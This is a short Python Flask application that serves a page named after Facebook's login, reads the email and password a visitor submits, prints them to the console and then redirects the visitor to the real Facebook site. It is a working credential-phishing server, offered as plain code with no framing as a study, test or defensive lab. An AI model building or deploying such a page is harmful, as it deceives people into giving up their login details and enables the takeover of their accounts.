from flask import Flask, render_template,request,redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('facebook.html')
@app.route('/order', methods=['POST'])
def order():
    email = request.form.get('email')
    password = request.form.get('password')
    print('Email: ',email,'Password :',password)
    return redirect('https://www.facebook.com')
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')